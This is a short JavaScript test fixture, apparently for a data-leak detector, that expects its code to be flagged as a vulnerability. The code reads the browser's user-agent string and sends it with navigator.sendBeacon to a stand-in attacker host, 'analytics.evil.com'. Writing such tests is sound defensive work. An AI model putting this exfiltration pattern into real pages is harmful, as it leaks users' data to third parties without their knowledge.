/**
 * Test: Data leak via sendBeacon
 * Expected: VULNERABILITY - userAgent to sendBeacon
 */

function test() {
  var ua = navigator.userAgent;
  var data = new FormData();
  data.append('browser', ua);
  navigator.sendBeacon('https://analytics.evil.com', data);
}

test();
